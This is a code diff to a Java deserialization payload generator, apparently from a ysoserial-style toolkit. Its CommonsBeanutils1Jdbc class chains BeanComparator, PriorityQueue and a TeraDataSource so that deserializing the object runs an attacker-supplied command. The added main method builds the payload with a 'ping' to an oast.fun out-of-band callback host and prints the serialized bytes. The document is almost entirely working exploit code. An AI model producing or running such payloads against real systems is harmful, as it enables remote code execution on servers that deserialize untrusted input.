@@ -9,8 +9,6 @@ import com.teradata.jdbc.TeraDataSource;
 import org.apache.commons.beanutils.BeanComparator;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
-import java.io.OutputStream;
 import java.math.BigInteger;
 import java.util.Arrays;
 import java.util.PriorityQueue;
@@ -20,26 +18,41 @@ import java.util.PriorityQueue;
 @Authors({Authors.FROHOFF})
 public class CommonsBeanutils1Jdbc implements ObjectPayload<Object> {
     public Object getObject(PayloadType type, String... param) throws Exception {
-        // create a TeraDataSource object, holding  our JDBC string
-        TeraDataSource dataSource = new TeraDataSource();
-        dataSource.setBROWSER(param[0]);
-        dataSource.setLOGMECH("BROWSER");
-        dataSource.setDSName("127.0.0.1");
-        dataSource.setDbsPort("10250");
+        try {
+            // create a TeraDataSource object, holding  our JDBC string
+            TeraDataSource dataSource = new TeraDataSource();
+            dataSource.setBROWSER(param[0]);
+            dataSource.setLOGMECH("BROWSER");
+            dataSource.setDSName("127.0.0.1");
+            dataSource.setDbsPort("10250");
 
-        // mock method name until armed
-        final BeanComparator comparator = new BeanComparator("lowestSetBit");
-        // create queue with numbers and basic comparator
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-        // stub data for replacement later
-        queue.add(new BigInteger("1"));
-        queue.add(new BigInteger("1"));
-        Reflections.setFieldValue(comparator, "property", "outputProperties");
-        // switch method called by comparator to "getConnection"
-        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        queueArray[0] = dataSource;
-        queueArray[1] = dataSource;
+            // mock method name until armed
+            final BeanComparator comparator = new BeanComparator("lowestSetBit");
+            // create queue with numbers and basic comparator
+            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+            // stub data for replacement later
+            queue.add(new BigInteger("1"));
+            queue.add(new BigInteger("1"));
+            Reflections.setFieldValue(comparator, "property", "outputProperties");
+            // switch method called by comparator to "getConnection"
+            final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+            queueArray[0] = dataSource;
+            queueArray[1] = dataSource;
 
-        return queue;
+            return queue;
+        } catch (Throwable er) {
+            // 如果生成或序列化有效负载时出现错误，则打印错误信息和堆栈跟踪
+            System.err.println("Error while generating or serializing payload");
+            er.printStackTrace();
+        }
+        return null;
+    }
+
+    public static void main(String[] args) throws Exception {
+        ObjectPayload payload = CommonsBeanutils1Jdbc.class.newInstance();
+        Object       object  = payload.getObject(PayloadType.nu1r, "ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun");
+        ByteArrayOutputStream out   = new ByteArrayOutputStream();
+        byte[]                bytes = Serializer.serialize(object, out);
+        System.out.println(Arrays.toString(bytes));
     }
 }
